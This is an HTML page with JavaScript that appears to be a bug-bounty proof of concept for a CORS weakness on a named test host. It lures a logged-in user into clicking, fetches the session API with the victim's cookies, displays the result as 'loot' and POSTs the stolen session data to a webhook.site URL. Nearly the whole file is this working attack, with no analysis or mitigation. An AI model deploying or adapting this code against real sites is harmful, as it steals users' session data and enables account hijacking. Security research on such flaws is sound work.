<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS PoC – top-level navigation trick (pop-in)</title>
  <style>
    body{font-family:Arial,Helvetica,sans-serif;margin:3rem}
    a.button{display:inline-block;background:#28a745;color:#fff;padding:.8rem 1.4rem;text-decoration:none;border-radius:4px}
    #loot{background:#f6f8fa;padding:1rem;border:1px solid #e1e4e8;white-space:pre-wrap}
  </style>
</head>
<body>
  <h2>CORS PoC – DeLorean Drive (pop-in tab)</h2>

  <!--  primed = we just came back from the navigation  -->
  <div id="primed" style="display:none">
    <p>⏳ Stealing session …</p>
    <pre id="loot"></pre>
  </div>

  <!--  initial state  -->
  <div id="start">
    <p>Click the button to start (you must be logged in).</p>
    <a class="button" href="#" onclick="prime()">1. Prime cookie & pop tab</a>
  </div>

  <script>
    const TARGET = 'https://delorean-drive-test.tomtomgroup.com/api/session';
    const EXFIL  = 'https://webhook.site/445b3885-da06-4d12-b4c2-477cc5d38aa6';
    const MY_URL = location.origin + location.pathname;

    let pop = null;

    /*  -----  part 1 : open JSON in new tab  ----- */
    function prime() {
      pop = window.open(TARGET + '?cb=' + Date.now(), '_blank');
      if (!pop) return alert('Allow pop-ups and try again.');
      document.getElementById('start').innerHTML = '<p>Tab opened – waiting …</p>';
      waitForReturn();
    }

    /*  -----  part 2 : poll until the tab loads our URL again  ----- */
    function waitForReturn() {
      const t = setInterval(() => {
        try {
          // can we read location.href? if yes, user is back on our origin
          if (pop.location.href.startsWith(MY_URL)) {
            clearInterval(t);
            pop.close();
            document.getElementById('start').style.display  = 'none';
            document.getElementById('primed').style.display = 'block';
            steal();
          }
        } catch (e) {
          /* cross-origin DOMException – still on JSON page, ignore */
        }
      }, 500);

      // safety time-out (10 s)
      setTimeout(() => {
        clearInterval(t);
        if (!pop.closed) pop.close();
        document.getElementById('start').innerHTML = '<p>⏱️ Timed out – cookie grace window may still be open; reload this page and try again.</p>';
      }, 10000);
    }

    /*  -----  part 3 : fetch while cookie still hot  ----- */
    async function steal() {
      try {
        const res = await fetch(TARGET, {method:'GET', credentials:'include'});
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();
        document.getElementById('loot').textContent = JSON.stringify(data, null, 2);
        fetch(EXFIL, {
          method : 'POST',
          body   : JSON.stringify(data),
          headers: {'Content-Type':'application/json'}
        });
      } catch (e) {
        document.getElementById('loot').textContent = '❌  ' + e;
      }
    }

    /*  -----  bootstrap : did we come back primed?  ----- */
    if (location.search.includes('primed=1')) {
      document.getElementById('start').style.display  = 'none';
      document.getElementById('primed').style.display = 'block';
      steal();
    }
  </script>
</body>
</html>
